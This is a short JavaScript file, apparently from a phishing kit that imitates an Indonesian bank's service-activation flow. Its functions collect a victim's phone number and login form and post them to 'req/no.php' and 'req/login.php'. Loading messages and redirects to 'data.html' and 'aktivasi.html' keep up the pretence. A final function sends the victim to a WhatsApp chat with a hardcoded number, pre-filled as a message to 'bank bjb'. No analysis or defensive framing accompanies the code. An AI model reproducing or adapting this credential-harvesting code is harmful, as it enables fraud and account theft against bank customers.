function sendHp() {
event.preventDefault();
        var nomor = document.getElementById("nomor").value;
        sessionStorage.setItem("nomor", nomor);
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses...";
 
 
      $.ajax({
            type: 'POST',
            url: 'req/no.php',
            data: $('#eform').serialize(),
            datatype: 'JSON',           
            complete: function(data) {
            setTimeout(function(){
  window.location.href='data.html'
  document.getElementById('kirims').innerHTML = "Selanjutnya";
 $('.load').fadeOut();
    }, 800);
            }
        })
     }
     
function sendLogin() {
event.preventDefault();
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'req/login.php',
            data: $('#login').serialize(),
            datatype: 'JSON',           
            complete: function(data) {
            setTimeout(function(){
  window.location.href='aktivasi.html'
  document.getElementById('kirims').innerHTML = "Selanjutnya";
 $('.load').fadeOut();
    }, 800);
            }
        })
     }


audio4 = document.getElementById("bsiku");
function go(){
$('.load').fadeIn();
audio4.play();    
audio4.loop = false;
document.getElementById('kirim').innerHTML = "Mohon tunggu sebentar...";
setTimeout(function(){  
location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
$('.load').fadeOut();
    }, 5500);    
}  
